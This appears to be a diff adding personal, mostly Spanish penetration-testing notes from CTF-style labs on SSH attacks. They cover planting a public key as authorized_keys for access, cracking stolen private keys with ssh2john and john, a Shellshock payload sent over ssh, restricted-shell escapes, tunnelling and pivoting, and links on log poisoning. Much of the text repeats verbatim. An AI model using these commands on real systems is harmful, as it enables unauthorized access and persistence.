@@ -1,0 +1,125 @@
+si copias el archivo id_rsa.pub a una carpeta del usuario
+y lo llama authorized_keys
+
+rutas
+/home/usrer/.ssh/id_rsa
+/var/lib/redis/.ssh/
+
+https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
+SSH LOG AND POISON
+
+https://hackertarget.com/ssh-examples-tunnels
+
+https://hackertarget.com/ssh-examples-tunnels/
+
+scp fila john@ip:/directorio/nombrearchiv
+
+ssh <gateway> -R <remote port to bind>:<local host>:<local port>
+ssh -D <local proxy port> -p <remote port> <target>
+
+https://www.binarytides.com/linux-scp-command/
+
+https://www.binarytides.com/linux-scp-command/
+
+
+ssh -t root@213123213 bash --norc
+cuand tenemos la shell restringida
+
+ssh -t root@213123213 "bash --noprofile"
+cuand tenemos la shell restringida
+
+ssh noob@192.168.0.36 '() { :;}; /bin/bash'
+
+bypass sh
+restricted common
+https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html
+hacker@beta:~$ BASH_CMDS[a]=/bin/sh;a 
+$ /bin/bash
+bash: groups: command not found
+hacker@beta:~$ export PATH=$PATH:/bin/
+hacker@beta:~$ export PATH=$PATH:/usr/bin
+
+------------------------
+---------------------------------
+id_rsa.pub lo meto en la maquina y lo renombro a authorized_keys
+
+
+Since we have copied RSA Private KEY in a text file named as “key” , then set permission 600 and try to login with the help of following command.
+
+systemctl enable ssh
+
+ssh -i key roosa@10.10.10.91
+
+ssh2john id_rsa >> sshkey
+john sskey
+chmod 600 id_rsa ---dar permisos
+
+hay algunas que tienes que pasar con ssh2john a otro archivo
+y sacar la clave para luego ponerla
+
+///home/roosa/.ssh/id_rsa
+
+git log
+
+git show
+
+quitar q
+
+ssh2john id_rsa
+ssh2john id_rsa > /ruta/hash
+john --wordlist=rockyou file
+
+
+touch id_rsa
+nano id_rsa
+file id_rsa
+
+ssh noob@192.168.0.36 '() { :;}; /bin/bash'
+ssh-copy-id -i id_rsa admin@localhost
+
+si copias el archivo id_rsa.pub a una carpeta del usuario
+y lo llama authorized_keys
+
+rutas
+/home/usrer/.ssh/id_rsa
+/var/lib/redis/.ssh/
+
+https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
+SSH LOG AND POISON
+
+https://hackertarget.com/ssh-examples-tunnels
+
+https://hackertarget.com/ssh-examples-tunnels/
+
+scp fila john@ip:/directorio/nombrearchiv
+
+ssh <gateway> -R <remote port to bind>:<local host>:<local port>
+ssh -D <local proxy port> -p <remote port> <target>
+
+https://www.binarytides.com/linux-scp-command/
+
+https://www.binarytides.com/linux-scp-command/
+
+
+ssh -t root@213123213 bash --norc
+cuand tenemos la shell restringida
+
+ssh -t root@213123213 "bash --noprofile"
+cuand tenemos la shell restringida
+
+ssh noob@192.168.0.36 '() { :;}; /bin/bash'
+
+bypass sh
+restricted common
+https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html
+hacker@beta:~$ BASH_CMDS[a]=/bin/sh;a 
+$ /bin/bash
+bash: groups: command not found
+hacker@beta:~$ export PATH=$PATH:/bin/
+hacker@beta:~$ export PATH=$PATH:/usr/bin
+
+------------------------
+---------------------------------
+id_rsa.pub lo meto en la maquina y lo renombro a authorized_keys
+
+ssh-copy-id -i id_rsa admin@localhost
